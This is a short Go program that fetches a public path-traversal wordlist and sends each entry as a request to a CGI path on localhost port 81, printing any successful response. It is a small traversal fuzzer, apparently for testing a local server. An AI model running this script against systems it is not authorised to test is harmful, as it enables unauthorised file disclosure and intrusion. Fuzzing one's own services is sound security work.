package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
)

func HttpGet(url string) string {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		panic(err)
	}
	client := new(http.Client)
	response, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	if response.StatusCode != 200 {
		return ""
	}
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		log.Fatal(err)
	}
	return string(body)
}

func main() {
	target := "http://localhost:81/cgi-bin/%s"
	payload := HttpGet("https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/Injections/Traversal.txt")
	lstPayload := strings.Split(payload, "\n")
	for _, value := range lstPayload {
		value = strings.Replace(value, "\r", "", -1)
		value = strings.Replace(value, "\t", "", -1)
		url := fmt.Sprintf(target, value)
		ret := HttpGet(url)
		if ret != "" {
			fmt.Println(ret)
		}
	}
}
